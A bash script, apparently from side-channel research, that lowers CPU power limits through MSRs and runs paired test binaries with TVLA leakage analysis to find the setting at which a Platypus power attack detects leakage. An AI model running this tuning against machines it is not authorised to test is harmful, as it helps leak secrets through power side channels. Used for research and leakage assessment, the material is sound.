#!/bin/bash

source ../.venv/bin/activate

# Platypus Attack Power Tuning Script
# This script finds the optimal power limit for the Platypus attack by
# gradually reducing the power limit until TVLA leakage is detected

set -e  # Exit immediately if a command exits with a non-zero status

# Initial power limit settings
INITIAL_POWER=1300
MIN_POWER=100
POWER_STEP=100
CURRENT_POWER=$INITIAL_POWER

# Default settings for other parameters
ENABLE1=1
ENABLE2=1
CLAMP1=0
CLAMP2=0
TIME_WINDOW1=15  # 0xF
TIME_WINDOW2=15  # 0xF

NUM_CORES=4


# Output file for results
RESULTS_FILE="platypus_results.log"
echo "Power Limit, TVLA Result" > $RESULTS_FILE

# Check if user is root
if [ "$EUID" -ne 0 ]; then
    echo "This script must be run as root to access MSRs."
    echo "Please run with: sudo $0"
    exit 1
fi

# Check if MSR module is loaded
if ! lsmod | grep -q "^msr "; then
    echo "Loading MSR module..."
    modprobe msr
    if [ $? -ne 0 ]; then
        echo "Failed to load MSR module. Are you running a supported kernel?"
        exit 1
    fi
fi

echo "===== Platypus Attack Power Limit Tuner ====="
echo "Starting with power limit: $CURRENT_POWER"
echo "Will decrease by $POWER_STEP until leakage is detected or minimum $MIN_POWER is reached"

# Function to run the test with current power settings
function run_test() {
    local power=$1
    local num_cores=$2  # New parameter for number of cores
    
    echo "Testing with power limit: $power on $num_cores cores"
    
    # Set the power limit using the controller
    echo "Setting power limit..."
    ./controller $power $power $ENABLE1 $ENABLE2 $CLAMP1 $CLAMP2 $TIME_WINDOW1 $TIME_WINDOW2
    if [ $? -ne 0 ]; then
        echo "Failed to set power limit. Skipping this test."
        return 2
    fi
    
    # Run the tests
    echo "Running test with factor=0 on $num_cores cores..."
    sudo taskset -c 0-$((num_cores-1)) ./multi_core_main 0 $num_cores 2> data/zero_"$power".csv
    
    echo "Running test with factor=255 on $num_cores cores..."
    sudo taskset -c 0-$((num_cores-1)) ./multi_core_main 255 $num_cores 2> data/full_"$power".csv
    
    # Run TVLA analysis
    echo "Running TVLA analysis..."
    TVLA_RESULT=$(python3 test.py data/zero_"$power".csv data/full_"$power".csv "$power" | grep "TVLA Test Result:" | awk '{print $4}')
    
    echo "TVLA Result: $TVLA_RESULT"
    
    # Log result
    echo "$power, $TVLA_RESULT, $num_cores cores" >> $RESULTS_FILE
    
    # Return the TVLA result (1 = leakage detected, 0 = no leakage)
    return $TVLA_RESULT
}

# Main test loop
LEAK_DETECTED=0
SUCCESS_POWER=0

while [ $CURRENT_POWER -ge $MIN_POWER ] && [ $LEAK_DETECTED -eq 0 ]; do
    echo "============================================"
    echo "Testing power limit: $CURRENT_POWER with $NUM_CORES cores"
    
    run_test $CURRENT_POWER $NUM_CORES
    TEST_RESULT=$?
    
    if [ $TEST_RESULT -eq 1 ]; then
        LEAK_DETECTED=1
        SUCCESS_POWER=$CURRENT_POWER
        echo "SUCCESS: Leakage detected at power limit $CURRENT_POWER!"
    elif [ $TEST_RESULT -eq 0 ]; then
        echo "No leakage detected at power limit $CURRENT_POWER. Decreasing power limit..."
        CURRENT_POWER=$((CURRENT_POWER - POWER_STEP))
    else
        echo "Test failed. Decreasing power limit and trying again..."
        CURRENT_POWER=$((CURRENT_POWER - POWER_STEP))
    fi
done

# Summarize results
echo "============================================"
if [ $LEAK_DETECTED -eq 1 ]; then
    echo "Platypus attack successful!"
    echo "The optimal power limit for running the Platypus attack is: $SUCCESS_POWER"
else
    echo "No leakage detected at any tested power limit (down to $MIN_POWER)."
    echo "Try adjusting other parameters or checking hardware compatibility."
fi

echo "Results have been saved to $RESULTS_FILE"
echo "============================================"

# Clean up (optional, commented out by default)
# make clean
